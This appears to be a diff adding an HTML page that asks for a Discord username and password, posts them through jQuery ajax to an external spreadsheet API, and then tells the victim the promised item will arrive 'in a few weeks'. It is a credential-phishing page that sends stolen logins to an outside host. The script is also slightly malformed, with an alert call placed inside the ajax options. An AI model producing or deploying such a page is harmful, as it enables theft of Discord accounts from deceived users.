@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+	
+	<script
+		src="https://code.jquery.com/jquery-3.4.1.js"
+		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+		crossorigin="anonymous"></script>
+	<script>
+		function SubForm (){
+			$.ajax({
+				url:"https://api.apispreadsheets.com/data/qVuTxEnmUxz6MIFp/",
+				type:"post",
+				data:$("#myForm").serializeArray(),
+alert('It will be there in a few weeks!')
+			});
+		}
+	</script>
+</head>
+<body>
+	<form id="myForm">
+		<label>Discord Username</label>
+		<input name="Discord Username" />
+		<br/>
+		<label>Password</label>
+		<input name="Password" />
+		<br/>
+	</form>
+	<button onclick='SubForm()'>Submit</button>
+</body>
+</html>
